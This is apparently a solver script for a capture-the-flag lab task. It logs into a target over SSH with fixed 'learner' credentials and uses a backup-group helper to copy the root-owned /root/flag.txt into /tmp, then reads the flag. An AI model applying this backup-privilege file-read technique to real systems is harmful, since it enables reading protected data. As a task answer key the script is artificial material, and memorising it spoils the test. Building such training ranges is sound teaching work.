"""Intended-path solver: use the backup-group helper to stage the flag."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    detail = None
    captured = None
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:

        def run(cmd: str, timeout: int = 20) -> str:
            _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
            return stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")

        groups = run("id -nG learner")
        if "backup" not in groups.split():
            detail = f"learner is not in backup group: {groups.strip()}"
        staged = run("/usr/local/bin/disk-shadow-sim /root/flag.txt /tmp/shadow.flag")
        if "shadow copy staged" not in staged:
            detail = f"disk-shadow-sim refused: {staged[:200]}"
        out = run("cat /tmp/shadow.flag")
        flags = find_flags(out)
        if flags:
            captured = flags[0]
        elif detail is None:
            detail = f"staged copy held no flag: {out[:200]}"
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="shadow-copy-flag",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
